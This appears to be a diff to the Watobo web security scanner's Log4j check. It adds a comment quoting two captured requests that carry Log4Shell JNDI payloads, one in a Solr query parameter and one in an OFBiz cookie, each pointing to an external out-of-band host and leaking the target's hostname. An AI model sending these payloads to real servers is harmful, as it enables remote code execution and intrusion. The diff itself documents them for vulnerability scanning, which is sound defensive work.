@@ -3,7 +3,23 @@ module Watobo #:nodoc: all
   module Modules
     module Active
       module Java
+=begin
+REAL WORLD EXAMPLES
+GET /solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.cbel8dn6lmeo17kdnff0stexrog5fpg9k.oast.online/a%7D HTTP/1.1
+Host: x:8443
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
 
+GET /webtools/control/main HTTP/1.1
+Host: x:8443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+Connection: close
+Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.cbel8dn6lmeo17kdnff0r6gosmkisde39.oast.online}
+Accept-Encoding: gzip
+=end
 
         class Log4j < Watobo::ActiveCheck
 
